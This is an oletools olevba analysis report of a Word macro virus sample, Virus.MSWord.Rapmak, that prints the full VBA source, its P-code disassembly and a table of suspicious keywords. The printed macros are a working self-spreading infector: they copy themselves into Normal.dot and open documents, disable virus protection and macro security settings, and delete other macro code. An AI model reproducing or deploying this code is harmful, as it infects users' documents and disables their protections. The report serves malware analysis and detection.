olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rapmak
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rapmak - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DPMmay2000.bas 
in file: Virus.MSWord.Rapmak - OLE stream: 'Macros/VBA/DPMmay2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
'Create by Yean Sin from DPM May 2000 TARC(Kampar, Perak)
'The purpose is to delete another virus on the computer lab
End Sub
Sub ViewVBCode()
End Sub
Sub FileTemplates()
End Sub
Sub DisPrompt()
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
End Sub
Sub ToolsOptions()
On Error GoTo StopExit
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    DisPrompt
StopExit:
End Sub
Sub InfactAc()
On Error GoTo StopExit
    Dim AcInfacted As Boolean
    AcInfacted = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "DPMmay2000" Then AcInfacted = True
        If Obj.Name <> "DPMmay2000" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    Nor = NormalTemplate.FullName & "CCIP/DPM"
    Ac = ActiveDocument.FullName & "CCIP/DPM"
    If AcInfacted = False Then
        Application.OrganizerCopy Source:=Left(Nor, Len(Nor) - 8), _
        Destination:=Left(Ac, Len(Ac) - 8), Name:="DPMmay2000", _
        Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
StopExit:
End Sub
Sub InfactNor()
On Error GoTo StopExit
    Dim NorInfacted As Boolean
    NorInfacted = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "DPMmay2000" Then NorInfacted = True
        If Obj.Name <> "DPMmay2000" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorInfacted = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="DPMmay2000", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
StopExit:
End Sub
Sub Clear97()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  Options.ConfirmConversions = (5 - 5): Options.VirusProtection = (3 - 3): Options.SaveNormalPrompt = (2 - 2)
End If
Set AcDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NorDoc = NormalTemplate.VBProject.VBComponents.Item(1)
AcDocLine = AcDoc.CodeModule.CountOfLines
NorDocLine = NorDoc.CodeModule.CountOfLines
If AcDocLine <> 0 Then
    AcDoc.CodeModule.deleteLines 1, AcDocLine
End If
If NorDocLine <> 0 Then
    NorDoc.CodeModule.deleteLines 1, NorDocLine
End If
End Sub
Sub Inf()
    InfactNor
    InfactAc
    Clear97
End Sub
Sub FileOpen()
On Error Resume Next
    WordBasic.DisableAutoMacros True
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        Inf
    End If
    WordBasic.DisableAutoMacros False
End Sub
Sub AutoOpen()
On Error Resume Next
    DisPrompt
    Inf
End Sub
Sub AutoClose()
    DisplayMsg
End Sub
Sub DisplayMsg()
On Error GoTo StopExit
If Day(Date) = 13 Then
    For i = 0 To 1300
        Beep
    Next
    MsgBox "                We have finished DPM course in 2001 with" & vbCrLf & _
           "             the help of all CCIP and DPM course Lacturers," & vbCrLf & _
           "         we would like to express our highest gratitude to them." & vbCrLf & _
           "Their concerted dedication toward our study is highly appreciated. ", , "DPM may 2000"
End If
StopExit:
End Sub
Sub FileSave()
On Error Resume Next
    ActiveDocument.Save
    InfactAc
    DisplayMsg
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rapmak
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/DPMmay2000 - 7102 bytes
' Line #0:
' 	FuncDefn (Sub ToolsMacro())
' Line #1:
' 	QuoteRem 0x0000 0x0038 "Create by Yean Sin from DPM May 2000 TARC(Kampar, Perak)"
' Line #2:
' 	QuoteRem 0x0000 0x003A "The purpose is to delete another virus on the computer lab"
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Sub ViewVBCode())
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub FileTemplates())
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Sub DisPrompt())
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub ToolsOptions())
' Line #14:
' 	OnError StopExit 
' Line #15:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #17:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #18:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #19:
' 	ArgsCall DisPrompt 0x0000 
' Line #20:
' 	Label StopExit 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Sub InfactAc())
' Line #23:
' 	OnError StopExit 
' Line #24:
' 	Dim 
' 	VarDefn AcInfacted (As Boolean)
' Line #25:
' 	LitVarSpecial (False)
' 	St AcInfacted 
' Line #26:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #27:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000A "DPMmay2000"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St AcInfacted 
' 	EndIf 
' Line #28:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000A "DPMmay2000"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #29:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0008 "CCIP/DPM"
' 	Concat 
' 	St Nor 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0008 "CCIP/DPM"
' 	Concat 
' 	St Ac 
' Line #34:
' 	Ld AcInfacted 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LineCont 0x0008 11 00 08 00 23 00 08 00
' 	Ld Nor 
' 	Ld Nor 
' 	FnLen 
' 	LitDI2 0x0008 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	ParamNamed Source 
' 	Ld Ac 
' 	Ld Ac 
' 	FnLen 
' 	LitDI2 0x0008 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	ParamNamed Destination 
' 	LitStr 0x000A "DPMmay2000"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Label StopExit 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub InfactNor())
' Line #41:
' 	OnError StopExit 
' Line #42:
' 	Dim 
' 	VarDefn NorInfacted (As Boolean)
' Line #43:
' 	LitVarSpecial (False)
' 	St NorInfacted 
' Line #44:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #45:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000A "DPMmay2000"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NorInfacted 
' 	EndIf 
' Line #46:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000A "DPMmay2000"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #47:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	Ld NorInfacted 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LineCont 0x0004 09 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "DPMmay2000"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #52:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Label StopExit 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub Clear97())
' Line #57:
' 	OnError (Resume Next) 
' Line #58:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #59:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #60:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #63:
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AcDoc 
' Line #66:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NorDoc 
' Line #67:
' 	Ld AcDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St AcDocLine 
' Line #68:
' 	Ld NorDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NorDocLine 
' Line #69:
' 	Ld AcDocLine 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #70:
' 	LitDI2 0x0001 
' 	Ld AcDocLine 
' 	Ld AcDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall deleteLines 0x0002 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld NorDocLine 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #73:
' 	LitDI2 0x0001 
' 	Ld NorDocLine 
' 	Ld NorDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall deleteLines 0x0002 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub Inf())
' Line #77:
' 	ArgsCall InfactNor 0x0000 
' Line #78:
' 	ArgsCall InfactAc 0x0000 
' Line #79:
' 	ArgsCall Clear97 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub FileOpen())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #84:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #85:
' 	ArgsCall Inf 0x0000 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub AutoOpen())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	ArgsCall DisPrompt 0x0000 
' Line #92:
' 	ArgsCall Inf 0x0000 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub AutoClose())
' Line #95:
' 	ArgsCall DisplayMsg 0x0000 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Sub DisplayMsg())
' Line #98:
' 	OnError StopExit 
' Line #99:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0514 
' 	For 
' Line #101:
' 	ArgsCall Beep 0x0000 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	LineCont 0x000C 05 00 0B 00 09 00 0B 00 0D 00 0B 00
' 	LitStr 0x0038 "                We have finished DPM course in 2001 with"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x003B "             the help of all CCIP and DPM course Lacturers,"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0040 "         we would like to express our highest gratitude to them."
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0043 "Their concerted dedication toward our study is highly appreciated. "
' 	Concat 
' 	ParamOmitted 
' 	LitStr 0x000C "DPM may 2000"
' 	ArgsCall MsgBox 0x0003 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	Label StopExit 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub FileSave())
' Line #108:
' 	OnError (Resume Next) 
' Line #109:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #110:
' 	ArgsCall InfactAc 0x0000 
' Line #111:
' 	ArgsCall DisplayMsg 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

